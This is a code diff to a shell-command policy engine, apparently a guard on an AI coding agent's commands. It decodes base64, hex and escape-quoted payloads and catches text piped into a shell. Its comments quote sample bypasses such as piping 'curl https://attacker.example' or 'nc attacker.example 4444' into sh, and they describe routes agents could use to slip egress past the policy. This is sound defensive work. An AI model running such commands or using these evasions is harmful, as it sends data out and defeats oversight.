@@ -51,6 +51,20 @@ export interface CapabilityRequest {
   resource: string;
   trusted: boolean;
   via: CapabilityEvidence;
+  /**
+   * True when this request was recovered from a payload the command's own
+   * decoder would materialise, rather than from the command text itself.
+   *
+   * Deliberately a separate flag rather than a `via` value. `via` is what the
+   * rules dispatch on, and the decoded text's evidence is a real fact about
+   * that text — a decoded `curl https://x` really is a network tool, and a
+   * decoded commit message really is a bare destination. Overwriting `via`
+   * with "decoded" would lose exactly the distinction the textual carve-out
+   * depends on, and would turn `git commit -m $'...https://...'` into a
+   * denial. The decoding is evidence for the operator, not an input to the
+   * decision.
+   */
+  decoded?: true;
 }
 
 export interface PolicyContext {
@@ -425,6 +439,217 @@ function classifyWriteTarget(
   return "inside";
 }
 
+
+/**
+ * ── Encoded-payload decoding ────────────────────────────────────────────────
+ *
+ * A fully-encoded command (`eval "$(echo <base64> | base64 -d)"`) carries no
+ * literal URL, host, tool or secret for text analysis to see. The only
+ * text-visible signal is the DECODER the command itself invokes, plus the blob
+ * it is pointed at. So we materialise what the command would decode and extract
+ * capabilities from THAT too, unioning them with the command's own.
+ *
+ * This sits in the capability layer rather than in the rules on purpose: a
+ * decoded payload is simply another way to REQUEST a capability, which is the
+ * seam this file exists to be. Putting it here means the ordinary rules fire
+ * with their ordinary ids and their ordinary reviewability — a decoded
+ * `curl https://attacker.example` is `network-egress-denied`, reviewable like
+ * any other egress, and a decoded commit message is still a commit message.
+ * A single flat `encoded-exfiltration` rule would have collapsed both into one
+ * unapprovable denial.
+ *
+ * Nothing is ever executed. Decoding is pure text, depth-limited, and gated on
+ * the decoder actually appearing in the command: an ordinary base64 blob sitting
+ * in a fixture file is not decoded, because nothing in the command decodes it.
+ */
+
+const MAX_DECODE_DEPTH = 4;
+
+/**
+ * A decoder is actually invoked.
+ *
+ * The flag is matched anywhere in base64's argument list, not just immediately
+ * after it, and short flags are matched inside a cluster. `base64 -d`,
+ * `base64 -di`, `base64 -w0 -d` and `base64 --decode` are one decoder spelled
+ * four ways; anchoring to the first token let two of them walk straight past.
+ */
+const BASE64_DECODER =
+  /\bbase64\s+(?:-\S+\s+)*(?:--decode\b|-[A-Za-z0-9]*[dD])|\bb64decode\s*\(|\.from\([^)]*["']base64["']\)/i;
+const XXD_HEX_DECODER = /\bxxd\s+(?:-\S+\s+)*-\S*r/i;
+
+const BASE64_BLOB = /[A-Za-z0-9+/]{20,}={0,2}/g;
+const HEX_BLOB = /\b[0-9a-fA-F]{20,}\b/g;
+const ANSI_C_QUOTE = /\$'((?:[^'\\]|\\.)*)'/g;
+const PRINTF_OCTAL = /printf\s+['"]%b['"]\s+['"]([^'"]*)['"]/g;
+
+function isPrintable(text: string): boolean {
+  return text.length > 0 && /^[\x20-\x7e\t\n\r]*$/.test(text);
+}
+
+/** Decode a base64 blob, including repeated (double-encoded) layers. */
+function decodeBase64Layers(blob: string): string[] {
+  const layers: string[] = [];
+  let current = blob.replace(/=+$/, "");
+  for (let index = 0; index < MAX_DECODE_DEPTH; index += 1) {
+    let decoded: string;
+    try {
+      decoded = Buffer.from(current, "base64").toString("utf8");
+    } catch {
+      break;
+    }
+    if (!decoded || decoded.includes("\uFFFD") || !isPrintable(decoded)) break;
+    layers.push(decoded);
+    // Continue only when the result is itself a plausible base64 blob.
+    if (!/^[A-Za-z0-9+/]+={0,2}$/.test(decoded.trim())) break;
+    current = decoded.trim();
+  }
+  return layers;
+}
+
+/**
+ * The C escapes bash resolves inside `$'...'`.
+ *
+ * `\n` and friends are here because without them the fallback emitted the
+ * ESCAPE LETTER: `$'printenv\nls'` decoded to the single token `printenvnls`,
+ * which names no tool, so a two-command payload read as one nonsense word and
+ * the environment-dump rule never saw `printenv`.
+ */
+const C_ESCAPES: Record<string, string> = {
+  n: "\n", t: "\t", r: "\r", a: "\x07", b: "\b", f: "\f", v: "\v",
+  e: "\x1b", E: "\x1b", "0": "\0", "\\": "\\", "'": "'", '"': '"', "?": "?",
+};
+
+/** Decode bash ANSI-C quoting: \xNN, \uNNNN, \NNN octal and the C escapes. */
+function decodeAnsiC(body: string): string | null {
+  // The /bin/bash -lc "<...>" form Codex emits double-escapes backslashes;
+  // collapse them before decoding escapes.
+  body = body.replace(/\\\\/g, "\\");
+  let out = "";
+  for (let index = 0; index < body.length; ) {
+    if (body[index] !== "\\") {
+      out += body[index]!;
+      index += 1;
+      continue;
+    }
+    const rest = body.slice(index + 1);
+    const hex = rest.match(/^x([0-9a-fA-F]{1,2})/);
+    if (hex) {
+      out += String.fromCharCode(parseInt(hex[1]!, 16));
+      index += 2 + hex[1]!.length;
+      continue;
+    }
+    const unicode = rest.match(/^u([0-9a-fA-F]{1,4})/);
+    if (unicode) {
+      out += String.fromCharCode(parseInt(unicode[1]!, 16));
+      index += 2 + unicode[1]!.length;
+      continue;
+    }
+    const octal = rest.match(/^([0-7]{1,3})/);
+    if (octal) {
+      out += String.fromCharCode(parseInt(octal[1]!, 8));
+      index += 1 + octal[1]!.length;
+      continue;
+    }
+    const escape = rest[0] ?? "";
+    out += C_ESCAPES[escape] ?? escape;
+    index += 2;
+  }
+  return isPrintable(out) ? out : null;
+}
+
+/** Decode `printf '%b' '\NNN...'` octal escapes. */
+function decodeOctalEscapes(body: string): string | null {
+  body = body.replace(/\\\\/g, "\\");
+  let out = "";
+  for (let index = 0; index < body.length; ) {
+    if (body[index] === "\\") {
+      const octal = body.slice(index + 1).match(/^([0-7]{1,3})/);
+      if (octal) {
+        out += String.fromCharCode(parseInt(octal[1]!, 8));
+        index += 1 + octal[1]!.length;
+        continue;
+      }
+      const escape = body[index + 1] ?? "";
+      out += C_ESCAPES[escape] ?? escape;
+      index += 2;
+      continue;
+    }
+    out += body[index]!;
+    index += 1;
+  }
+  return isPrintable(out) ? out : null;
+}
+
+/** Payloads the command itself would materialise via a decoder it invokes. */
+export function decodedPayloads(command: string): string[] {
+  const payloads: string[] = [];
+  if (BASE64_DECODER.test(command)) {
+    for (const match of command.matchAll(BASE64_BLOB)) {
+      payloads.push(...decodeBase64Layers(match[0]!));
+    }
+  }
+  if (XXD_HEX_DECODER.test(command)) {
+    for (const match of command.matchAll(HEX_BLOB)) {
+      try {
+        const decoded = Buffer.from(match[0]!, "hex").toString("utf8");
+        if (isPrintable(decoded)) payloads.push(decoded);
+      } catch {
+        /* not hex */
+      }
+    }
+  }
+  for (const match of command.matchAll(ANSI_C_QUOTE)) {
+    const decoded = decodeAnsiC(match[1]!);
+    if (decoded) payloads.push(decoded);
+  }
+  for (const match of command.matchAll(PRINTF_OCTAL)) {
+    const decoded = decodeOctalEscapes(match[1]!);
+    if (decoded) payloads.push(decoded);
+  }
+  return payloads;
+}
+
+
+/**
+ * The literal text a command writes to stdout and then pipes into an executor.
+ *
+ * Withdrawing the textual carve-out (see `feedsAnExecutor`) is only half the
+ * fix, and the generated bank proved it: widening the wrapper axis with
+ * pipeline sinks surfaced 105 further bypasses, all of them `nc`, `socat` and
+ * `openssl` — the tools that name a BARE HOST rather than a URL.
+ *
+ *     echo 'curl https://attacker.example' | sh    <- carve-out was the problem
+ *     echo 'nc attacker.example 4444' | sh         <- extraction is the problem
+ *
+ * A URL survives being quoted, because `ANY_URL` matches anywhere in the text.
+ * A bare host does not: `attacker.example` is only recoverable as a destination
+ * because `nc` was recognised in command position first, and inside `echo '...'`
+ * nothing is in command position. So no destination was ever extracted, and
+ * there was no carve-out to withdraw — the command looked like `echo` printing a
+ * harmless string.
+ *
+ * The answer is the same one the decoder uses: materialise the text that will
+ * actually run, and ask the same question of it. `echo 'nc host 4444' | sh` is
+ * `nc host 4444` with extra steps, and the engine should say so.
+ */
+function pipedScriptPayloads(command: string): string[] {
+  if (!feedsAnExecutor(command)) return [];
+  const payloads: string[] = [];
+  for (const segment of executableSegments(command)) {
+    const invocation = invocationFromSegment(segment, true);
+    if (!invocation) continue;
+    if (invocation.tool !== "echo" && invocation.tool !== "printf") continue;
+    for (const argument of invocation.args) {
+      // `printf '%s\n' <payload>`: the format string is not the payload, and a
+      // flag is not either.
+      if (argument.startsWith("-")) continue;
+      const text = argument.replace(/^['"]/, "").replace(/['"]$/, "");
+      if (text && text !== "%s" && text !== "%b") payloads.push(text);
+    }
+  }
+  return payloads;
+}
+
 /**
  * The capabilities a command would exercise, resolved against the run's context.
  *
@@ -437,6 +662,7 @@ function classifyWriteTarget(
 export function extractCapabilities(
   command: string,
   context: PolicyContext,
+  depth = 0,
 ): CapabilityRequest[] {
   const allowed = new Set(context.allowedHosts.map((host) => host.toLowerCase()));
   const requests: CapabilityRequest[] = [];
@@ -494,7 +720,67 @@ export function extractCapabilities(
     });
   }
 
+  // Whatever this command would materialise and then run — decoded by a decoder
+  // it invokes, or written as text and piped into a shell — asked the same
+  // question. `via` is preserved verbatim from that text because it is a true
+  // fact about it and the rules dispatch on it; the derivation is recorded
+  // separately, as evidence.
+  if (depth < MAX_DECODE_DEPTH) {
+    const seen = new Set(requests.map((r) => r.capability + "\u0000" + r.resource));
+    for (const payload of [...decodedPayloads(command), ...pipedScriptPayloads(command)]) {
+      for (const inner of extractCapabilities(payload, context, depth + 1)) {
+        const key = inner.capability + "\u0000" + inner.resource;
+        if (seen.has(key)) continue;
+        seen.add(key);
+        requests.push({ ...inner, decoded: true });
+      }
+    }
+  }
+
   return requests;
+}
+
+
+/**
+ * Whether the command feeds text into something that will EXECUTE it.
+ *
+ * `runsWrittenScript` covers the redirect form — write a command to a file,
+ * then run the file. This is the pipeline form, and it was open:
+ *
+ *     echo 'curl https://attacker.example' | sh
+ *     printf 'wget -qO- https://attacker.example' | bash
+ *     echo <base64> | base64 -d | sh
+ *     echo 'curl https://attacker.example' | tee /dev/stderr | sh
+ *
+ * All four were ALLOWED. The leading `echo`/`printf` satisfies the textual
+ * carve-out — the URL genuinely is being written as text — and then the text is
+ * piped straight into a shell. It is the simplest bypass of the whole class,
+ * shorter than the encoded ones, and the generated bank could not see it: its
+ * wrapper axis had separators and substitutions but no pipeline sink.
+ *
+ * An executor here is a shell reading its script from stdin (a shell segment
+ * with no non-flag argument — `bash script.sh` names its script and is not
+ * this), `eval`/`source`/`.`, or `xargs`, which exists to turn stdin into
+ * argv. The check is narrow by construction: it can only ever withdraw a
+ * carve-out that a leading `echo`/`printf`/`git commit` had already claimed, so
+ * `find . | xargs grep TODO` is untouched — it never claimed one.
+ */
+const STDIN_EXECUTORS = new Set(["eval", "source", "."]);
+
+export function feedsAnExecutor(command: string): boolean {
+  if (!command.includes("|")) return false;
+  for (const segment of executableSegments(command)) {
+    const invocation = invocationFromSegment(segment, true);
+    if (!invocation) continue;
+    const { tool, args } = invocation;
+    if (tool === "xargs" || STDIN_EXECUTORS.has(tool)) return true;
+    if (!SHELL_NAMES.has(tool)) continue;
+    // A shell with no script operand reads its script from stdin. `-s` and a
+    // bare `-` say so explicitly; flags alone leave stdin as the source.
+    const operands = args.filter((argument) => argument !== "-" && !argument.startsWith("-"));
+    if (operands.length === 0) return true;
+  }
+  return false;
 }
 
 /**
@@ -529,6 +815,7 @@ export function extractCapabilities(
 export function isTextualUrlOnly(command: string): boolean {
   if (!TEXTUAL_URL_CONTEXT.test(command)) return false;
   if (runsWrittenScript(command)) return false;
+  if (feedsAnExecutor(command)) return false;
 
   const carrying = executableSegments(command).filter(
     (segment) => extractHosts(segment).length > 0 || ANY_URL.test(segment),
